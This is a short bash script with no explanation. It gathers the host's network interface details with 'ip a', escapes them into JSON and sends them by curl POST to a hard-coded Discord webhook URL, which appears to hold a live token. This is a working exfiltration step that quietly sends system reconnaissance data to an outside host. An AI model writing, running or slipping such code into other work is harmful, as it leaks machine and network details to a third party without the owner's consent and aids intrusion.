#https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5

# Discord webhook URL
WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"

# Collect network data
NETWORK_DATA=$(ip a)

# Escape newlines and quotes for JSON payload
ESCAPED_NETWORK_DATA=$(echo "$NETWORK_DATA" | sed -e 's/[\/&]/\\&/g' -e 's/"/\\"/g' -e 's/$/\\n/' | tr -d '\n')

# Send data to Discord
curl -H "Content-Type: application/json" \
     -X POST \
     -d "{\"content\": \"Network Data:\n$ESCAPED_NETWORK_DATA\"}" \
     $WEBHOOK_URL
